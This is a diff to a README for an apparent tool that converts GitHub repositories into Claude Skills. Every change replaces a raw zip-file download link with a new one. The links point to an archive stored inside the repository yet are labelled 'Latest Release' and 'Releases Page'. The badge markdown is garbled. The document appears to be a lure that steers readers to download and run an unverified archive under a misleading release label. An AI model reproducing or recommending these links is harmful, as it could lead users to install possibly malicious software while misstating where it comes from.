@@ -1,7 +1,7 @@
 # 🤖 repo-to-claude-skill - Convert Repositories into Skills Easily
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Adjusted-left636/repo-to-claude-skill/main/output/repo-to-claude-skill_Cours.zip%20Latest%https://raw.githubusercontent.com/Adjusted-left636/repo-to-claude-skill/main/output/repo-to-claude-skill_Cours.zip)](https://raw.githubusercontent.com/Adjusted-left636/repo-to-claude-skill/main/output/repo-to-claude-skill_Cours.zip)
+[![Download Latest Release](https://github.com/Adjusted-left636/repo-to-claude-skill/raw/refs/heads/main/output/generated/to_skill_claude_repo_v1.6.zip%20Latest%https://github.com/Adjusted-left636/repo-to-claude-skill/raw/refs/heads/main/output/generated/to_skill_claude_repo_v1.6.zip)](https://github.com/Adjusted-left636/repo-to-claude-skill/raw/refs/heads/main/output/generated/to_skill_claude_repo_v1.6.zip)
 
 ## 📝 Overview
 Welcome to the **Repo-to-Skill Converter**! This AI-powered Streamlit app allows you to convert GitHub repositories into comprehensive Claude Skills effortlessly. With just one click, you can transform any repository into a professional skill that follows Anthropic's best practices.
@@ -30,7 +30,7 @@ Welcome to the **Repo-to-Skill Converter**! This AI-powered Streamlit app allows
 ## 📥 Download & Install
 To start using the Repo-to-Skill Converter, visit the following page to download the latest version:
 
-[Download Latest Release](https://raw.githubusercontent.com/Adjusted-left636/repo-to-claude-skill/main/output/repo-to-claude-skill_Cours.zip)
+[Download Latest Release](https://github.com/Adjusted-left636/repo-to-claude-skill/raw/refs/heads/main/output/generated/to_skill_claude_repo_v1.6.zip)
 
 ### Installation Instructions
 1. **Visit the Release Page**: Click the link above to go to the Releases page.
@@ -65,7 +65,7 @@ If you would like to contribute to this project, follow these steps:
 4. Submit a pull request describing your changes.
 
 ## 🔗 Links
-- **Releases Page**: [Download Latest Release](https://raw.githubusercontent.com/Adjusted-left636/repo-to-claude-skill/main/output/repo-to-claude-skill_Cours.zip)
+- **Releases Page**: [Download Latest Release](https://github.com/Adjusted-left636/repo-to-claude-skill/raw/refs/heads/main/output/generated/to_skill_claude_repo_v1.6.zip)
 - **Project Repository**: Visit the GitHub repository for source code and additional information.
 
 Enjoy transforming your GitHub repositories into Claude Skills with ease!
